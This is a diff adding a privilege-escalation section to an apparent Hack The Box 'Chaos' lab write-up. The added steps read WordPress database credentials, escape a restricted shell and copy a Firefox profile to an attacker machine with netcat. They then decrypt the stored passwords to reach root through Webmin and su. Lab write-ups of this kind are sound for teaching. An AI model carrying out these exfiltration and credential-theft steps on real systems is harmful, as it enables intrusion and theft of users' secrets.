@@ -182,7 +182,58 @@ After sending the request we get a shell with the user _www-data_!
 
 ## Privilege Escalation
 
-We can get the password for WordPress from the
+We can get the password for WordPress from the the file _wp-config.php_ in this path:
+> /var/www/html/wp/wordpress/wp-config.php
 
+The credentials we get are:
+```markdown
+/* MySQL database username */                 
+define('DB_USER', 'roundcube');
+                                                   
+/* MySQL database password */
+define('DB_PASSWORD', 'inner[OnCag8');
+```
 
+When we try the password from _ayush_ that we gained earlier from WordPress we can change from the www-data user to his.
+Soon we realize that no commands work because his user is in a restriced shell, that we can verify by outputting the environment variable:
+```markdown
+echo $PATH
 
+# Output
+/home/ayush/.app
+```
+
+In this directory we find three commands that _ayush_ can execute: 
+- dir
+- ping
+- tar
+
+We either can look on [GTFOBins](https://gtfobins.github.io/) and escape the restricted shell with the `tar` command or by executing `export PATH=/bin` to execute all commands.
+
+Now we can print the contents of his home folder and see a _.mozilla_ folder in which we can find stored password from Firefox in the from the profile **/home/ayush/.mozilla/firefox/bzo7sjt1.default** with the tool [firefox_decrypt](https://github.com/unode/firefox_decrypt).
+
+Downloading the folder to our local machine:
+```markdown
+# On box
+tar -zcvf /dev/shm/.mozilla.tar.gz .mozilla
+nc 10.10.14.9 9002 < /dev/shm/.mozilla.tar.gz
+
+# On our machine:
+nc -lvnp 9002 > mozilla.tar.gz
+tar zxvf mozilla.tar.gz
+```
+
+Executing that script in that directory and using the same password from _ayush_ again:
+```markdown
+python firefox_decrypt.py /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/
+```
+```markdown
+Master Password for profile /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/: 
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+```
+
+These credentials work for the **Webmin** service that runs on port 10000 from where we can start a webshell.
+The password also works for the root user if we just change to him via `su`!
